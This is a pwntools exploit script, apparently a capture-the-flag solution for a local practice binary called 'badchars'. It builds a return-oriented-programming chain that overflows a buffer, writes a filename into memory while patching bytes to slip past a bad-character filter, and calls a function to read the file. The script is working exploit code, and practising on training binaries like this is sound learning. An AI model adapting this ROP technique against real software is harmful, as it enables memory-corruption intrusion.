from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./badchars', checksec=False)

p = process("./badchars")

#gdb.attach(p, gdbscript='''
#b*pwnme+268
#c
#x/s 0x6010f0
#''')

ret = ROP(elf).find_gadget(["ret"])[0]
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
pop_r14_r15 = ROP(elf).find_gadget(["pop r14", "pop r15", "ret"])[0]
mov_r12_r13 = 0x0000000000400634
pop_r12_r13_r14_r15 = 0x000000000040069c
vuln = elf.sym['usefulFunction']
gadget = elf.sym['usefulGadgets']

null_addr = 0x6010f0
   
payload1 = flat(
	cyclic(0x28),
	pop_r12_r13_r14_r15,
	b"fl,,,t,t",
	null_addr,
	p64(2),
	null_addr+4,
	mov_r12_r13,
	gadget,
	
	pop_r14_r15,
	p64(75),
	null_addr+3,
	gadget,
	
	pop_r14_r15,
	p64(77),
	null_addr+2,
	gadget,
	
	pop_r14_r15,
	p64(84),
	null_addr+6,
	gadget,
	
	pop_rdi_ret,
	null_addr,
	vuln+9
	
    )

p.sendlineafter(b">",payload1)
p.interactive()
